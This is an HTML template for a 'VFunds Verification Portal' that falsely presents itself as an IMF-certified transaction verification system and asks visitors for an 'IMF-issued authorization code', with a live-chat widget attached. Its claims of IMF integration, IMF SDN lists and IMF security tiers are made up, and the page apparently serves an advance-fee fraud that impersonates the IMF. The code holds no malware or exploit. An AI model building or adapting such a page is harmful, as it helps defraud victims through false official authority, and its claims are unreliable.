<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IMF-Verified Payment Portal | Secure Access</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css" rel="stylesheet">
    <style>
        :root {
            --primary: #005da6; /* IMF blue */
            --secondary: #00a3e0; /* IMF accent blue */
            --accent: #e51937; /* IMF red */
            --light: #f5f9fc;
            --dark: #002b49;
            --text: #333333;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Roboto', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #f5f9fc 0%, #e6f0f7 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: var(--text);
            line-height: 1.6;
        }
        
        .portal-container {
            width: 100%;
            max-width: 1000px;
            background: white;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0, 45, 73, 0.1);
            overflow: hidden;
            display: flex;
            min-height: 650px;
        }
        
        .portal-info {
            flex: 1;
            background: linear-gradient(135deg, var(--primary) 0%, var(--dark) 100%);
            color: white;
            padding: 40px;
            display: flex;
            flex-direction: column;
            position: relative;
        }
        
        .imf-badge {
            position: absolute;
            top: 20px;
            right: 20px;
            background: rgba(255,255,255,0.1);
            padding: 8px 12px;
            border-radius: 4px;
            font-size: 12px;
            font-weight: 600;
        }
        
        .logo-container {
            margin-bottom: 30px;
            text-align: center;
        }
        
        .logo {
            height: 40px;
            width: auto;
            margin-bottom: 10px;
        }
        
        .portal-tagline {
            font-size: 16px;
            opacity: 0.9;
            margin-bottom: 30px;
            text-align: center;
            font-weight: 500;
        }
        
        .portal-content h2 {
            font-size: 28px;
            margin-bottom: 25px;
            font-weight: 600;
            letter-spacing: 0.5px;
        }
        
        .portal-content p {
            margin-bottom: 20px;
            opacity: 0.9;
            font-size: 15px;
        }
        
        .feature-list {
            margin: 30px 0;
            list-style: none;
        }
        
        .feature-list li {
            position: relative;
            padding-left: 32px;
            margin-bottom: 15px;
            font-size: 15px;
        }
        
        .feature-list li:before {
            content: "✓";
            position: absolute;
            left: 0;
            color: var(--secondary);
            font-weight: bold;
            font-size: 18px;
        }
        
        .auth-container {
            flex: 1;
            padding: 50px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            background: white;
        }
        
        .auth-header {
            margin-bottom: 35px;
            text-align: center;
        }
        
        .auth-header h1 {
            color: var(--primary);
            font-size: 28px;
            margin-bottom: 10px;
            font-weight: 700;
        }
        
        .auth-header p {
            color: #5a6a7a;
            font-size: 15px;
        }
        
        .auth-form {
            width: 100%;
            max-width: 400px;
            margin: 0 auto;
        }
        
        .form-group {
            margin-bottom: 25px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 10px;
            font-weight: 500;
            color: var(--dark);
            font-size: 14px;
        }
        
        .form-control {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #d1d9e2;
            border-radius: 6px;
            font-size: 15px;
            transition: all 0.3s;
            background-color: #f9fbfd;
            letter-spacing: 1px;
        }
        
        .form-control:focus {
            border-color: var(--secondary);
            box-shadow: 0 0 0 3px rgba(0, 163, 224, 0.1);
            outline: none;
            background-color: white;
        }
        
        .btn-verify {
            background: linear-gradient(to right, var(--primary), var(--secondary));
            color: white;
            border: none;
            padding: 15px;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            width: 100%;
            margin-top: 15px;
            letter-spacing: 0.5px;
        }
        
        .btn-verify:hover {
            background: linear-gradient(to right, #004b8d, #0091c8);
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(0, 45, 73, 0.1);
        }
        
        .security-badge {
            margin-top: 30px;
            text-align: center;
            font-size: 12px;
            color: #7f8c9a;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .security-badge i {
            margin-right: 8px;
            color: var(--secondary);
            font-size: 16px;
        }
        
        .compliance-notice {
            margin-top: 30px;
            padding: 15px;
            background: #f8fafc;
            border-radius: 6px;
            font-size: 12px;
            color: #5a6a7a;
            text-align: center;
            border-left: 3px solid var(--secondary);
        }
        
        .loading-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 45, 73, 0.8);
            z-index: 9999;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            color: white;
        }
        
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
            margin-bottom: 15px;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        @media (max-width: 768px) {
            .portal-container {
                flex-direction: column;
                min-height: auto;
            }
            
            .portal-info, .auth-container {
                padding: 30px;
            }
            
            .imf-badge {
                position: static;
                margin-bottom: 20px;
                text-align: center;
            }
        }
    </style>
</head>
<body>
    <div class="loading-overlay">
        <div class="spinner"></div>
        <p>Verifying credentials...</p>
    </div>

    <div class="portal-container">
        <div class="portal-info">
            <div class="imf-badge">IMF-Compliant Verification</div>
            <div class="logo-container">
                <img src="5df16d8f13f4cced330e587b_stellar-logo-solo-1-removebg-preview.png" alt="Secure Payment Portal" class="logo">
                <div class="portal-tagline">IMF-Certified Transaction Verification System</div>
            </div>

            <div class="portal-content">
                <h2>VFunds Verification Portal</h2>
                <p>This IMF-compliant verification system ensures all international transactions meet the strictest anti-money laundering (AML) and counter-terrorism financing (CTF) standards under IMF Article VIII.</p>
                
                <ul class="feature-list">
                    <li>Direct integration with IMF's Financial Transaction Validation Network (FTVN)</li>
                    <li>Real-time compliance checks against IMF SDN lists</li>
                    <li>End-to-end encrypted using IMF-recommended 256-bit AES protocols</li>
                    <li>Multi-factor authentication meeting IMF security tier 4 requirements</li>
                    <li>Automated reporting to IMF Financial Monitoring Division</li>
                    <li>24/7 monitoring by IMF-certified security specialists</li>
                </ul>
                
                <p>All access attempts are logged and audited according to IMF financial transparency guidelines. Unauthorized access will be reported to appropriate regulatory authorities.</p>
            </div>
        </div>

        <div class="auth-container">
            <div class="auth-header">
                <h1>Secure Access Verification</h1>
                <p>Enter your IMF-issued authorization code</p>
            </div>

            <form id="codeForm" class="auth-form" action="{{ route('verify.code') }}" method="POST">
                @csrf
                <div class="form-group">
    <label for="access_code">Unique Transaction ID</label>
    <input type="text" class="form-control" id="access_code" name="access_code" 
           placeholder="XXXX-XXXX-XXXX" required 
           title="Enter your verification code">
</div>

                <button type="submit" class="btn-verify" id="submitBtn">
                    VERIFY ID
                </button>
            </form>

            <div class="compliance-notice">
                This system complies with IMF Special Data Dissemination Standard (SDDS) and General Data Dissemination System (GDDS)
            </div>

            <div class="security-badge">
                <i>🔐</i> <span>All verifications are recorded in IMF Financial Integrity Database</span>
            </div>
        </div>
    </div>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
    <script>
        $(document).ready(function() {
            toastr.options = {
                positionClass: 'toast-top-right',
                progressBar: true,
                closeButton: true,
                timeOut: 5000,
                preventDuplicates: true
            };

            // Format code input with dashes
            $('#access_code').on('input', function() {
                let val = $(this).val().replace(/-/g, '');
                if (val.length > 20) val = val.substr(0, 20);
                let newVal = '';
                for (let i = 0; i < val.length; i++) {
                    if (i > 0 && i % 4 === 0) newVal += '';
                    newVal += val[i];
                }
                $(this).val(newVal);
            });

            $('#codeForm').on('submit', function(e) {
                e.preventDefault();
                $('.loading-overlay').show();
                $('#submitBtn').prop('disabled', true);

                $.ajax({
                    url: $(this).attr('action'),
                    method: 'POST',
                    data: $(this).serialize(),
                    success: function(response) {
                        if (response.success) {
                            toastr.success(response.message);
                            setTimeout(() => {
                                window.location.href = response.redirect;
                            }, 1500);
                        } else {
                            toastr.error(response.message);
                            $('.loading-overlay').hide();
                            $('#submitBtn').prop('disabled', false);
                        }
                    },
                    error: function(xhr) {
                        let errorMsg = xhr.responseJSON?.message || 'IMF Verification Error: Please contact financial administrator';
                        toastr.error(errorMsg);
                        $('.loading-overlay').hide();
                        $('#submitBtn').prop('disabled', false);
                    }
                });
            });
        });
    </script>
    <!-- Smartsupp Live Chat script -->
<script type="text/javascript">
var _smartsupp = _smartsupp || {};
_smartsupp.key = 'ddd14f1143116db0dfdb7dbeeb25ae5b589f5a36';
window.smartsupp||(function(d) {
  var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
  s=d.getElementsByTagName('script')[0];c=d.createElement('script');
  c.type='text/javascript';c.charset='utf-8';c.async=true;
  c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
})(document);
</script>
<noscript> Powered by <a href=“https://www.smartsupp.com” target=“_blank”>Smartsupp</a></noscript>
</body>
</html>